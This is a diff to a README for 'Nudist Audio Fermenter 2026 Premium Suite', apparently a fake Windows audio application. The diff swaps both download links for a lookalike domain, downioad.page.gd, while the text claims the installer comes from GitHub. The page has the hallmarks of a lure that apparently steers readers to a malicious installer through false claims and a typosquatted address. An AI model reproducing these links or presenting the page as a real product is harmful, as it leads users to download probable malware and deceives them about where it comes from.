@@ -2,7 +2,7 @@
 
 Nudist Audio Fermenter 2026 Premium Suite is a powerful and comprehensive audio processing application designed for Windows desktops. It provides a full suite of tools for editing, enhancing, visualizing, and managing audio tracks with professional-grade precision and an intuitive user interface.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -55,6 +55,6 @@ A: Projects are saved in your user Documents folder under "Nudist Audio Fermente
 
 Get the latest stable version of the software from our official release page.
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 © 2026 Nudist Audio Fermenter Development Team. All rights reserved.
